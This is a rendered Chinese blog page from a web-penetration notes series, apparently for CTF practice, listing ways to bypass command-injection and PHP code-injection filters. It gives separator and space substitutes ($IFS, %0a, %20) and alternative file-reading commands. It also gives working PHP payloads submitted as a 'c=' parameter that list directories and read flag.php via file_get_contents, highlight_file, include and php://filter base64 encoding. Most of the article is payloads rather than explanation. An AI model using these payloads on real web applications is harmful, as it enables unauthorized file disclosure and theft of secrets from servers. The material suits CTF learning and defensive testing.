@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>常用字符替换 | My New Hugo Site</title>
+<meta name="keywords" content="常用字符替换">
+<meta name="description" content="
+
+；封号
+
+&amp;&amp;：
+
+在PHP中&amp;&amp;代表执行两个命令，让后面的命令进入黑洞。
+在shell及bash脚本中&amp;&amp;（逻辑与）：只有前一个命令成功（返回值 0）时，后一个命令才会执行。如果前一个命令永远不会失败（如 echo），则 &amp;&amp; 和 ; 看起来就像是等价的
+
+
+%0a即\n换行
+
+
+
+Space空格
+
+
+Tab：
+
+
+Tab（制表符）在 ASCII 码中是 \t（十进制 9）。Space（空格）在 ASCII 码中是 \x20（十进制 32）。
+
+
+在许多编辑器（如 VSCode、IDEA）或 expand 命令下，Tab 可以被自动转换为多个 Space（一般是 4 个或 8 个）。例如，Python PEP 8 规范推荐用 4 个 Space 代替 Tab。
+
+
+在 Shell 命令行中，多个空白字符（包括 Tab 和 Space）通常会被解析为相同的分隔符。
+
+
+在 Makefile 里，缩进 必须是 Tab，不能用 Space。
+
+
+
+
+$IFS：
+
+$IFS代表shell里面的空格
+
+
+
+&lt;
+
+
+&#43;
+
+
+%20
+
+
+
+
+cat
+
+
+more
+
+
+less
+
+
+sort
+
+
+tail
+
+
+head
+
+
+sed
+
+
+cut
+
+
+awk
+
+
+strings
+
+
+od
+
+
+curl
+
+
+tac">
+<meta name="author" content="AuranLu">
+<link rel="canonical" href="http://localhost:1313/posts/auran_lu/web%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C/%E5%B8%B8%E7%94%A8%E5%AD%97%E7%AC%A6%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%85%B6%E6%9B%BF%E6%8D%A2/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.36819bea596090d8b48cf10d9831382996197aa7e4fc86f792f7c08c9ca4d23b.css" integrity="sha256-NoGb6llgkNi0jPENmDE4KZYZeqfk/Ib3kvfAjJyk0js=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/auran_lu/web%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C/%E5%B8%B8%E7%94%A8%E5%AD%97%E7%AC%A6%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%85%B6%E6%9B%BF%E6%8D%A2/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="My New Hugo Site (Alt + H)">My New Hugo Site</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      常用字符替换
+    </h1>
+    <div class="post-meta"><span title='2025-03-10 00:00:00 +0000 UTC'>March 10, 2025</span>&nbsp;·&nbsp;AuranLu
+
+</div>
+  </header> 
+  <div class="post-content"><ul>
+<li>
+<p><code>；</code>封号</p>
+<ol>
+<li><code>&amp;&amp;</code>：
+<ol>
+<li>在PHP中<code>&amp;&amp;</code>代表执行两个命令，让后面的命令进入黑洞。</li>
+<li>在shell及bash脚本中<code>&amp;&amp;</code>（逻辑与）：只有前一个命令成功（返回值 <code>0</code>）时，后一个命令才会执行。如果前一个命令永远不会失败（如 <code>echo</code>），则 <code>&amp;&amp;</code> 和 <code>;</code> 看起来就像是等价的</li>
+</ol>
+</li>
+<li><code>%0a</code>即<code>\n</code>换行</li>
+</ol>
+</li>
+<li>
+<p><code>Space</code>空格</p>
+<ol>
+<li>
+<p><code>Tab</code>：</p>
+<ul>
+<li>
+<p><code>Tab</code>（制表符）在 ASCII 码中是 <code>\t</code>（十进制 9）。<code>Space</code>（空格）在 ASCII 码中是 <code>\x20</code>（十进制 32）。</p>
+</li>
+<li>
+<p>在许多编辑器（如 VSCode、IDEA）或 <code>expand</code> 命令下，<code>Tab</code> 可以被自动转换为多个 <code>Space</code>（一般是 4 个或 8 个）。例如，Python PEP 8 规范推荐用 4 个 <code>Space</code> 代替 <code>Tab</code>。</p>
+</li>
+<li>
+<p>在 Shell 命令行中，多个空白字符（包括 <code>Tab</code> 和 <code>Space</code>）通常会被解析为相同的分隔符。</p>
+</li>
+<li>
+<p>在 <code>Makefile</code> 里，缩进 <strong>必须是 <code>Tab</code></strong>，不能用 <code>Space</code>。</p>
+</li>
+</ul>
+</li>
+<li>
+<p><code>$IFS</code>：</p>
+<ul>
+<li><code>$IFS</code>代表shell里面的空格</li>
+</ul>
+</li>
+<li>
+<p><code>&lt;</code></p>
+</li>
+<li>
+<p><code>+</code></p>
+</li>
+<li>
+<p><code>%20</code></p>
+</li>
+</ol>
+</li>
+<li>
+<p><code>cat</code></p>
+<ol>
+<li>
+<p><code>more</code></p>
+</li>
+<li>
+<p><code>less</code></p>
+</li>
+<li>
+<p><code>sort</code></p>
+</li>
+<li>
+<p><code>tail</code></p>
+</li>
+<li>
+<p><code>head</code></p>
+</li>
+<li>
+<p><code>sed</code></p>
+</li>
+<li>
+<p><code>cut</code></p>
+</li>
+<li>
+<p><code>awk</code></p>
+</li>
+<li>
+<p><code>strings</code></p>
+</li>
+<li>
+<p><code>od</code></p>
+</li>
+<li>
+<p><code>curl</code></p>
+</li>
+<li>
+<p><code>tac</code></p>
+</li>
+<li>
+<p><code>nl</code></p>
+<pre tabindex="0"><code>nl {filename}.xx
+</code></pre></li>
+<li>
+<p><code>vi</code></p>
+</li>
+<li>
+<p><code>include('/flag.txt')</code></p>
+</li>
+<li>
+<p><code>reuqire('flag.txt')</code></p>
+</li>
+<li>
+<p><code>reuqire_once('flag.txt')</code></p>
+</li>
+</ol>
+</li>
+<li>
+<p><code>c=print_r(scandir(dirname('__FILE__')));</code></p>
+<ol>
+<li><code>print_r(scandir('./'))</code></li>
+<li><code>参数=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f-&gt;__toString().&quot; &quot;);}</code></li>
+<li><code>var_dump(scandir(&quot;/&quot;));</code></li>
+<li><code>参数=$a=opendir(&quot;./&quot;); while (($file = readdir($a)) !== false){echo $file . &quot;&lt;br&gt;&quot;; };</code></li>
+</ol>
+</li>
+<li>
+<p><code>file()</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">//payload示例
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">c</span><span style="color:#f92672">=</span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#39;flag.php&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">c</span><span style="color:#f92672">=</span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">highlight_file</span>(<span style="color:#e6db74">&#39;flag.php&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">c</span><span style="color:#f92672">=</span><span style="color:#a6e22e">highlight_file</span>(<span style="color:#e6db74">&#34;flag.php&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">c</span><span style="color:#f92672">=</span><span style="color:#a6e22e">show_source</span>(<span style="color:#e6db74">&#39;flag.php&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">c</span><span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>$a<span style="color:#f92672">=</span><span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;flag.php&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span>($b<span style="color:#f92672">=</span><span style="color:#a6e22e">fgets</span>($a)){
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> $b;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//file()函数：把整个文件读入一个数组中
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">c</span><span style="color:#f92672">=</span><span style="color:#a6e22e">print_r</span>(<span style="color:#a6e22e">file</span>(<span style="color:#e6db74">&#39;flag.php&#39;</span>));
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">c</span><span style="color:#f92672">=</span><span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">file</span>(<span style="color:#e6db74">&#39;flag.php&#39;</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">c</span><span style="color:#f92672">=</span><span style="color:#a6e22e">readfile</span>(<span style="color:#e6db74">&#34;flag.php&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//一行一行读取
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">c</span><span style="color:#f92672">=</span>$a<span style="color:#f92672">=</span><span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;flag.php&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);<span style="color:#66d9ef">while</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">feof</span>($a)) {$line <span style="color:#f92672">=</span> <span style="color:#a6e22e">fgets</span>($a);<span style="color:#66d9ef">echo</span> $line;}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//一个一个字符读取
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">c</span><span style="color:#f92672">=</span>$a<span style="color:#f92672">=</span><span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;flag.php&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);<span style="color:#66d9ef">while</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">feof</span>($a)) {$line <span style="color:#f92672">=</span> <span style="color:#a6e22e">fgetc</span>($a);<span style="color:#66d9ef">echo</span> $line;}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">c</span><span style="color:#f92672">=</span>$a<span style="color:#f92672">=</span><span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;flag.php&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);<span style="color:#66d9ef">while</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">feof</span>($a)) {$line <span style="color:#f92672">=</span> <span style="color:#a6e22e">fgetcsv</span>($a);<span style="color:#a6e22e">var_dump</span>($line);}
+</span></span></code></pre></div><ol>
+<li>
+<p><code>file_get_contents()</code></p>
+</li>
+<li>
+<p><code>highlight_file()</code></p>
+</li>
+<li>
+<p><code>show_source()</code></p>
+</li>
+<li>
+<p><code>fgets()</code></p>
+</li>
+<li>
+<p><code>readfile()</code></p>
+</li>
+<li>
+<p><code>fopen()</code></p>
+</li>
+<li>
+<p><code>include &quot; &quot;</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">c</span><span style="color:#f92672">=</span><span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#39;flag.php&#39;</span>);<span style="color:#66d9ef">echo</span> $flag;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">c</span><span style="color:#f92672">=</span><span style="color:#66d9ef">include</span>($_GET[<span style="color:#e6db74">&#39;1&#39;</span>]); <span style="color:#f92672">?</span><span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#a6e22e">php</span><span style="color:#f92672">://</span><span style="color:#a6e22e">filter</span><span style="color:#f92672">/</span><span style="color:#a6e22e">convert</span><span style="color:#f92672">.</span><span style="color:#a6e22e">base64</span><span style="color:#f92672">-</span><span style="color:#a6e22e">encode</span><span style="color:#f92672">/</span><span style="color:#a6e22e">resource</span><span style="color:#f92672">=</span><span style="color:#a6e22e">flag</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">c</span><span style="color:#f92672">=</span><span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#39;flag.php&#39;</span>);<span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">get_defined_vars</span>());
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//var_dump:输出注册变量
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//get_defined_vars():函数返回由所有已定义变量所组成的数组
+</span></span></span></code></pre></div></li>
+</ol>
+</li>
+</ul>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/%E5%B8%B8%E7%94%A8%E5%AD%97%E7%AC%A6%E6%9B%BF%E6%8D%A2/">常用字符替换</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/">My New Hugo Site</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
